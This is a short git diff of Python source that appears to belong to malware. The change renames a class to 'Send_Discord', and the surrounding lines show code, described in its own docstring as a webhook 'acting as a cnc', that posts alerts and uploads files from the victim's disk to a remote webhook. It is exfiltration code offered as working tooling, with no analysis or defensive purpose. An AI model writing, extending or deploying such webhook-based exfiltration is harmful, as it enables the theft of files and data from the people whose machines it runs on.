@@ -2,7 +2,7 @@ import requests
 import os
 import zipfile
 
-class Send(object):
+class Send_Discord(object):
     """
     Sends content to our webhook acting as a cnc
     """
@@ -50,4 +50,3 @@ class Send(object):
                 }
         requests.post(self.webhook,json=alert)
         requests.post(self.webhook, files={'upload_file': open(new,'rb')})
-
